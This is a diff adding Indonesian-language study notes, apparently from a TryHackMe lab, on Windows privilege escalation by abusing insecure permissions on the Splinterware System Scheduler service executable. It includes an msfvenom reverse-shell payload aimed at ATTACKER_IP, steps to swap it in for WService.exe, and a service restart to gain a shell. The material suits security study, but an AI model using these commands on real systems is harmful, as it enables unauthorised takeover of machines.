@@ -1,0 +1,75 @@
+# Windows services dimanage oleh SCM (Service Control Manager. Setiap service di windows punya associated exec dimana akan di run oleh SCM kapanpun service dimulai. Harus diingat bahwa service exec mengimplementasikan special function untuk bisa comms dengan SCM, dan karena itu tidak semua exec dapat started sebagai service successfully. Tiap service specifies user acc yang akan run. Contoh service kita bisa cek 
+```
+sc qc apphostsvc
+...
+SERVICE_NAME: apphostsvc
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Application Host Helper Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : localSystem
+```
+execnya adalah di BINARY_PATH_NAME, dan acc yang digunakan untuk run service ada di SERVICE_START_NAME.
+atau kita bisa cek di registry dibawah
+```
+HKLM\SYSTEM\CurrentControlSet\Services\...
+```
+
+## Contoh Insecure Permission di Service Executable
+dalam kasus ini adlaah Splinterware System Scheduler, cek dengan
+```
+sc qc WindowsScheduler
+...
+SERVICE_NAME: windowsscheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcuser1
+```
+dapat kita lihat bahwa service yang terinstall oleh vulnerable software run sebagai svcuser1 dan executable associated dengan service di `C:\PROGRA~2\SYSTEM~1\WService.exe`. Kemudian kita bisa coba untuk cek permission dari service di direktori tersebut
+```
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+...
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+                                  NT AUTHORITY\SYSTEM:(I)(F)
+                                  BUILTIN\Administrators:(I)(F)
+                                  BUILTIN\Users:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+```
+dari output tersebut kita temukan bahwa Everyone group punya Modify permission (M) pada service exec. berarti kita dapat menggantinya dengan payload pilihan kita. Sekarang kita generate payload exe-service dengan msfvenom
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+```
+selanjutnya kirimkan payload dengan python server seperti biasa. lalu lakukan hal berikut
+```
+# pindah ke dir service system tsb
+C:\> cd C:\PROGRA~2\SYSTEM~1\
+
+# buat backup
+C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+        1 file(s) moved.
+
+# copy file ke service dir
+C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+        1 file(s) moved.
+
+# memberi akses full pada Everyone group
+C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
+        Successfully processed 1 files.
+```
+selanjutnya siapkan listener dengan port yg sama sesuai payload, dan kita lakukan
+```
+C:\> sc stop windowsscheduler
+C:\> sc start windowsscheduler
+```
+dan kita akan mendapat revshell
